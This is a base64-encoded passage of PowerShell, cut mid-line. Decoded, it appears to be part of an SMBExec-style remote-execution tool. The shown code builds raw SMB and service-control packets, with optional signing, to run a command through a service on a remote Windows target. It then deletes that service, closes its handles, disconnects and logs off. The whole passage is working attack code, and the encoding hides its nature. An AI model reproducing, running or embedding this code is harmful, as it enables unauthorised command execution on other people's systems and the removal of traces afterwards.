AgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiU2VydmljZSBjcmVhdGlvbiBmYXVsdCBjb250ZXh0IG1pc21hdGNoIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJFeGVjX2ZhaWxlZCA9ICR0cnVlDQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgDQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgJ0RlbGV0ZVNlcnZpY2VXJw0KICAgICAgICAgICAgICAgICAgICB7IA0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZihbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRTTUJfY2xpZW50X3JlY2VpdmVbODguLjkxXSkgLWVxICcxZC0wNC0wMC0wMCcpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJDb21tYW5kIGV4ZWN1dGVkIHdpdGggc2VydmljZSAkU01CX3NlcnZpY2Ugb24gJFRhcmdldCINCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZihbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRTTUJfY2xpZW50X3JlY2VpdmVbODguLjkxXSkgLWVxICcwMi0wMC0wMC0wMCcpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJTZXJ2aWNlICRTTUJfc2VydmljZSBmYWlsZWQgdG8gc3RhcnQgb24gJFRhcmdldCINCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyID0gR2V0LVBhY2tldFNNQkhlYWRlciAweDJmIDB4MTggMHgwNSwweDI4ICRTTUJfdHJlZV9JRCAkcHJvY2Vzc19JRF9ieXRlcyAkU01CX3VzZXJfSUQNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9zaWduaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2hlYWRlclsiU01CSGVhZGVyX0ZsYWdzMiJdID0gMHgwNSwweDQ4DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zaWduaW5nX2NvdW50ZXIgPSAkU01CX3NpZ25pbmdfY291bnRlciArIDIgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgW0J5dGVbXV0kU01CX3NpZ25pbmdfc2VxdWVuY2UgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRTTUJfc2lnbmluZ19jb3VudGVyKSArIDB4MDAsMHgwMCwweDAwLDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9oZWFkZXJbIlNNQkhlYWRlcl9TaWduYXR1cmUiXSA9ICRTTUJfc2lnbmluZ19zZXF1ZW5jZQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NDTV9kYXRhID0gR2V0LVBhY2tldFNDTURlbGV0ZVNlcnZpY2VXICRTTUJfc2VydmljZV9jb250ZXh0X2hhbmRsZQ0KICAgICAgICAgICAgICAgICAgICAgICAgJFNDTV9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TQ01fZGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9SUENfZGF0YSA9IEdldC1QYWNrZXRSUENSZXF1ZXN0IDB4MDMgJFNDTV9kYXRhLmxlbmd0aCAwIDAgMHgwNCwweDAwLDB4MDAsMHgwMCAweDAwLDB4MDAgMHgwMiwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2hlYWRlciAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfZGF0YSA9IEdldC1QYWNrZXRTTUJXcml0ZUFuZFhSZXF1ZXN0ICRTQ01fZGF0YS5sZW5ndGgNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2RhdGFbIlNNQldyaXRlQW5kWFJlcXVlc3RfRklEIl0gPSAkU01CX0ZJRA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfZGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgJFJQQ19kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9SUENfZGF0YSANCiAgICAgICAgICAgICAgICAgICAgICAgICRSUENfZGF0YV9sZW5ndGggPSAkU01CX2RhdGEuTGVuZ3RoICsgJFNDTV9kYXRhLkxlbmd0aCArICRSUENfZGF0YS5MZW5ndGgNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUJfaGVhZGVyLkxlbmd0aCAkUlBDX2RhdGFfbGVuZ3RoDQogICAgICAgICAgICAgICAgICAgICAgICAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfc2lnbmluZykNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NpZ24gPSAkc2Vzc2lvbl9rZXkgKyAkU01CX2hlYWRlciArICRTTUJfZGF0YSArICRSUENfZGF0YSArICRTQ01fZGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc2lnbmF0dXJlID0gJE1ENS5Db21wdXRlSGFzaCgkU01CX3NpZ24pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zaWduYXR1cmUgPSAkU01CX3NpZ25hdHVyZVswLi43XQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2hlYWRlclsiU01CSGVhZGVyX1NpZ25hdHVyZSJdID0gJFNNQl9zaWduYXR1cmUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2hlYWRlcg0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zZW5kID0gJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlICsgJFNNQl9oZWFkZXIgKyAkU01CX2RhdGEgKyAkUlBDX2RhdGEgKyAkU0NNX2RhdGENCg0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLldyaXRlKCRTTUJfY2xpZW50X3NlbmQsMCwkU01CX2NsaWVudF9zZW5kLkxlbmd0aCkgPiAkbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLkZsdXNoKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5SZWFkKCRTTUJfY2xpZW50X3JlY2VpdmUsMCwkU01CX2NsaWVudF9yZWNlaXZlLkxlbmd0aCkgPiAkbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnUmVhZEFuZFhSZXF1ZXN0Jw0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2VfbmV4dCA9ICdDbG9zZVNlcnZpY2VIYW5kbGUnDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2Nsb3NlX3NlcnZpY2VfaGFuZGxlX3N0YWdlID0gMQ0KICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgJ0Nsb3NlU2VydmljZUhhbmRsZScNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9jbG9zZV9zZXJ2aWNlX2hhbmRsZV9zdGFnZSAtZXEgMSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJTZXJ2aWNlICRTTUJfc2VydmljZSBkZWxldGVkIG9uICRUYXJnZXQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbG9zZV9zZXJ2aWNlX2hhbmRsZV9zdGFnZSsrDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TQ01fZGF0YSA9IEdldC1QYWNrZXRTQ01DbG9zZVNlcnZpY2VIYW5kbGUgJFNNQl9zZXJ2aWNlX2NvbnRleHRfaGFuZGxlDQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnQ2xvc2VSZXF1ZXN0Jw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU0NNX2RhdGEgPSBHZXQtUGFja2V0U0NNQ2xvc2VTZXJ2aWNlSGFuZGxlICRTTUJfc2VydmljZV9tYW5hZ2VyX2NvbnRleHRfaGFuZGxlDQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9oZWFkZXIgPSBHZXQtUGFja2V0U01CSGVhZGVyIDB4MmYgMHgxOCAweDA1LDB4MjggJFNNQl90cmVlX0lEICRwcm9jZXNzX0lEX2J5dGVzICRTTUJfdXNlcl9JRA0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZigkU01CX3NpZ25pbmcpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyWyJTTUJIZWFkZXJfRmxhZ3MyIl0gPSAweDA1LDB4NDgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NpZ25pbmdfY291bnRlciA9ICRTTUJfc2lnbmluZ19jb3VudGVyICsgMiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBbQnl0ZVtdXSRTTUJfc2lnbmluZ19zZXF1ZW5jZSA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFNNQl9zaWduaW5nX2NvdW50ZXIpICsgMHgwMCwweDAwLDB4MDAsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2hlYWRlclsiU01CSGVhZGVyX1NpZ25hdHVyZSJdID0gJFNNQl9zaWduaW5nX3NlcXVlbmNlDQogICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICRTQ01fZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU0NNX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfUlBDX2RhdGEgPSBHZXQtUGFja2V0UlBDUmVxdWVzdCAweDAzICRTQ01fZGF0YS5sZW5ndGggMCAwIDB4MDUsMHgwMCwweDAwLDB4MDAgMHgwMCwweDAwIDB4MDAsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQl9oZWFkZXIgICANCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2RhdGEgPSBHZXQtUGFja2V0U01CV3JpdGVBbmRYUmVxdWVzdCAkU0NNX2RhdGEubGVuZ3RoDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9kYXRhWyJTTUJXcml0ZUFuZFhSZXF1ZXN0X0ZJRCJdID0gJFNNQl9GSUQNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICRSUENfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfUlBDX2RhdGEgDQogICAgICAgICAgICAgICAgICAgICAgICAkUlBDX2RhdGFfbGVuZ3RoID0gJFNNQl9kYXRhLkxlbmd0aCArICRTQ01fZGF0YS5MZW5ndGggKyAkUlBDX2RhdGEuTGVuZ3RoDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CX2hlYWRlci5MZW5ndGggJFJQQ19kYXRhX2xlbmd0aA0KICAgICAgICAgICAgICAgICAgICAgICAgJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZigkU01CX3NpZ25pbmcpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zaWduID0gJHNlc3Npb25fa2V5ICsgJFNNQl9oZWFkZXIgKyAkU01CX2RhdGEgKyAkUlBDX2RhdGEgKyAkU0NNX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NpZ25hdHVyZSA9ICRNRDUuQ29tcHV0ZUhhc2goJFNNQl9zaWduKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc2lnbmF0dXJlID0gJFNNQl9zaWduYXR1cmVbMC4uN10NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9oZWFkZXJbIlNNQkhlYWRlcl9TaWduYXR1cmUiXSA9ICRTTUJfc2lnbmF0dXJlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQl9oZWFkZXINCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc2VuZCA9ICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSArICRTTUJfaGVhZGVyICsgJFNNQl9kYXRhICsgJFJQQ19kYXRhICsgJFNDTV9kYXRhDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uV3JpdGUoJFNNQl9jbGllbnRfc2VuZCwwLCRTTUJfY2xpZW50X3NlbmQuTGVuZ3RoKSA+ICRudWxsDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uRmx1c2goKQ0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLlJlYWQoJFNNQl9jbGllbnRfcmVjZWl2ZSwwLCRTTUJfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKSA+ICRudWxsDQogICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAnQ2xvc2VSZXF1ZXN0Jw0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9oZWFkZXIgPSBHZXQtUGFja2V0U01CSGVhZGVyIDB4MDQgMHgxOCAweDA3LDB4YzggJFNNQl90cmVlX0lEICRwcm9jZXNzX0lEX2J5dGVzICRTTUJfdXNlcl9JRA0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZigkU01CX3NpZ25pbmcpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyWyJTTUJIZWFkZXJfRmxhZ3MyIl0gPSAweDA1LDB4NDgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NpZ25pbmdfY291bnRlciA9ICRTTUJfc2lnbmluZ19jb3VudGVyICsgMg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtCeXRlW11dJFNNQl9zaWduaW5nX3NlcXVlbmNlID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkU01CX3NpZ25pbmdfY291bnRlcikgKyAweDAwLDB4MDAsMHgwMCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyWyJTTUJIZWFkZXJfU2lnbmF0dXJlIl0gPSAkU01CX3NpZ25pbmdfc2VxdWVuY2UNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQl9oZWFkZXIgICANCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2RhdGEgPSBHZXQtUGFja2V0U01CQ2xvc2VSZXF1ZXN0IDB4MDAsMHg0MA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfZGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IEdldC1QYWNrZXROZXRCSU9TU2Vzc2lvblNlcnZpY2UgJFNNQl9oZWFkZXIuTGVuZ3RoICRTTUJfZGF0YS5MZW5ndGgNCiAgICAgICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9zaWduaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc2lnbiA9ICRzZXNzaW9uX2tleSArICRTTUJfaGVhZGVyICsgJFNNQl9kYXRhIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc2lnbmF0dXJlID0gJE1ENS5Db21wdXRlSGFzaCgkU01CX3NpZ24pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zaWduYXR1cmUgPSAkU01CX3NpZ25hdHVyZVswLi43XQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2hlYWRlclsiU01CSGVhZGVyX1NpZ25hdHVyZSJdID0gJFNNQl9zaWduYXR1cmUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2hlYWRlcg0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zZW5kID0gJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlICsgJFNNQl9oZWFkZXIgKyAkU01CX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5Xcml0ZSgkU01CX2NsaWVudF9zZW5kLDAsJFNNQl9jbGllbnRfc2VuZC5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ1RyZWVEaXNjb25uZWN0Jw0KICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgJ1RyZWVEaXNjb25uZWN0Jw0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9oZWFkZXIgPSBHZXQtUGFja2V0U01CSGVhZGVyIDB4NzEgMHgxOCAweDA3LDB4YzggJFNNQl90cmVlX0lEICRwcm9jZXNzX0lEX2J5dGVzICRTTUJfdXNlcl9JRA0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZigkU01CX3NpZ25pbmcpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyWyJTTUJIZWFkZXJfRmxhZ3MyIl0gPSAweDA1LDB4NDgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NpZ25pbmdfY291bnRlciA9ICRTTUJfc2lnbmluZ19jb3VudGVyICsgMg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtCeXRlW11dJFNNQl9zaWduaW5nX3NlcXVlbmNlID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkU01CX3NpZ25pbmdfY291bnRlcikgKyAweDAwLDB4MDAsMHgwMCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyWyJTTUJIZWFkZXJfU2lnbmF0dXJlIl0gPSAkU01CX3NpZ25pbmdfc2VxdWVuY2UNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQl9oZWFkZXIgICANCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2RhdGEgPSBHZXQtUGFja2V0U01CVHJlZURpc2Nvbm5lY3RSZXF1ZXN0DQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQl9kYXRhDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CX2hlYWRlci5MZW5ndGggJFNNQl9kYXRhLkxlbmd0aA0KICAgICAgICAgICAgICAgICAgICAgICAgJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZigkU01CX3NpZ25pbmcpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zaWduID0gJHNlc3Npb25fa2V5ICsgJFNNQl9oZWFkZXIgKyAkU01CX2RhdGEgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zaWduYXR1cmUgPSAkTUQ1LkNvbXB1dGVIYXNoKCRTTUJfc2lnbikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NpZ25hdHVyZSA9ICRTTUJfc2lnbmF0dXJlWzAuLjddDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyWyJTTUJIZWFkZXJfU2lnbmF0dXJlIl0gPSAkU01CX3NpZ25hdHVyZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfaGVhZGVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfaGVhZGVyDQogICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CX2hlYWRlciArICRTTUJfZGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLldyaXRlKCRTTUJfY2xpZW50X3NlbmQsMCwkU01CX2NsaWVudF9zZW5kLkxlbmd0aCkgPiAkbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLkZsdXNoKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5SZWFkKCRTTUJfY2xpZW50X3JlY2VpdmUsMCwkU01CX2NsaWVudF9yZWNlaXZlLkxlbmd0aCkgPiAkbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnTG9nb2ZmJw0KICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgJ0xvZ29mZicNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyID0gR2V0LVBhY2tldFNNQkhlYWRlciAweDc0IDB4MTggMHgwNywweGM4IDB4MzQsMHhmZSAkcHJvY2Vzc19JRF9ieXRlcyAkU01CX3VzZXJfSUQNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9zaWduaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2hlYWRlclsiU01CSGVhZGVyX0ZsYWdzMiJdID0gMHgwNSwweDQ4DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zaWduaW5nX2NvdW50ZXIgPSAkU01CX3NpZ25pbmdfY291bnRlciArIDIgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgW0J5dGVbXV0kU01CX3NpZ25pbmdfc2VxdWVuY2UgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRTTUJfc2lnbmluZ19jb3VudGVyKSArIDB4MDAsMHgwMCwweDAwLDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9oZWFkZXJbIlNNQkhlYWRlcl9TaWduYXR1cmUiXSA9ICRTTUJfc2lnbmluZ19zZXF1ZW5jZQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2hlYWRlciAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfZGF0YSA9IEdldC1QYWNrZXRTTUJMb2dvZmZBbmRYUmVxdWVzdA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfZGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IEdldC1QYWNrZXROZXRCSU9TU2Vzc2lvblNlcnZpY2UgJFNNQl9oZWFkZXIuTGVuZ3RoICRTTUJfZGF0YS5MZW5ndGgNCiAgICAgICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9zaWduaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc2lnbiA9ICRzZXNzaW9uX2tleSArICRTTUJfaGVhZGVyICsgJFNNQl9kYXRhIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc2lnbmF0dXJlID0gJE1ENS5Db21wdXRlSGFzaCgkU01CX3NpZ24pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zaWduYXR1cmUgPSAkU01CX3NpZ25hdHVyZVswLi43XQ0KICAgICAgICAgICAgICAgICAgICAgICAg